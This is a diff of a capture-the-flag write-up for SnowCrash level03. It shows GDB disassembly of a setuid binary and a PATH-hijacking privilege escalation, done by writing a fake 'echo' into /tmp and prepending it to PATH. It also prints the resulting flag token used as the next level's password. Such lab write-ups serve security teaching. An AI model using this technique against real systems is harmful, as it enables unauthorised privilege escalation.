@@ -1,18 +1,35 @@
 # level03
 
-- We log as `level03`
+- We login as user level03.
+```
+level03@SnowCrash:~$ ls -l
+total 12
+-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
 
-- A `level03` file is located inside the home directory of level03
+level03@SnowCrash:~$ ./level03
+Exploit me
+```
 
-- This is an executable file with special rights:
->`-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03`
 
-- Trying to execute it being logged as `level03` will execute it as `flag03`
+- A binary has been left for us; it belongs to user flag03 and the group level03. Additionally, [the setuid and setgid permission bits](https://en.wikipedia.org/wiki/Setuid) are set.
+Thus, this binary is executed with the privileges of user flag03 and the group level03.
+Let's take a closer look at this binary using [GDB](https://en.wikipedia.org/wiki/GNU_Debugger).
+```
+gdb ./level03
+...
+(gdb) info functions
+All defined functions:
 
-- Uppon execution it displays `Exploit me`
+File /home/user/level03/level03.c:
+int main(int, char **, char **);
 
-- We dissasemble the binary using gdb, here is the `main` function:
-```asm
+Non-debugging symbols:
+0x08048340  _init
+...
+```
+```
+(gdb) disas main
+Dump of assembler code for function main:
    0x080484a4 <+0>:     push   %ebp
    0x080484a5 <+1>:     mov    %esp,%ebp
    0x080484a7 <+3>:     and    $0xfffffff0,%esp
@@ -37,27 +54,31 @@
    0x080484f2 <+78>:    call   0x8048380 <setresuid@plt>
    0x080484f7 <+83>:    movl   $0x80485e0,(%esp)
    0x080484fe <+90>:    call   0x80483b0 <system@plt>
-   0x08048503 <+95>:    leave  
+   0x08048503 <+95>:    leave
    0x08048504 <+96>:    ret
+End of assembler dump.
 ```
 
-- We can see multiple function calls but the interesting one is `system` :
->`0x080484fe <+90>:    call   0x80483b0 <system@plt>`
 
-- The line above moves the argument of `system` on top of the stack:
->`0x080484f7 <+83>:    movl   $0x80485e0,(%esp)`
+- It can be seen that the program makes a call to `<system@plt>` right after moving the address `0x80485e0` to the top of [the stack](https://en.wikipedia.org/wiki/Stack_(abstract_data_type)).
+Let's display the value contained at this address.
+```
+(gdb) x/s 0x80485e0
+0x80485e0:       "/usr/bin/env echo Exploit me"
+```
 
-- Let's display the content of `0x80485e0` with `(gdb) x/s 0x80485e0` :
->`0x80485e0:       "/usr/bin/env echo Exploit me"`
 
-- We can see that the `echo` command is vulnerable to `PATH` environment variable manipulation because it is called using `/usr/bin/env` which forces the binary to be found inside `PATH` variable
+- So, the program calls `system("/usr/bin/env echo Exploit me")`.
+In bash, `echo` is a built-in command, but with the preceding `/usr/bin/env`, the program will use the `PATH` environment variable to search for the echo binary.
+```
+level03@SnowCrash:~$ echo "getflag" > /tmp/echo
+level03@SnowCrash:~$ chmod +x /tmp/echo
+level03@SnowCrash:~$ export PATH=/tmp:$PATH
 
-- We create a shell script named `echo` inside `/tmp` which contains:
->`getflag`
+level03@SnowCrash:~$ ./level03
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
 
-- We add `/tmp` at the front of `PATH` with:
->`export PATH=/tmp:$PATH`
-
-- We run `./level03` inside the home directory of `level03`
-
-- We get the flag `qi0maab88jeaj46qoumi7maus`
+level03@SnowCrash:~$ su level04
+Password:qi0maab88jeaj46qoumi7maus
+level04@SnowCrash:~$
+```
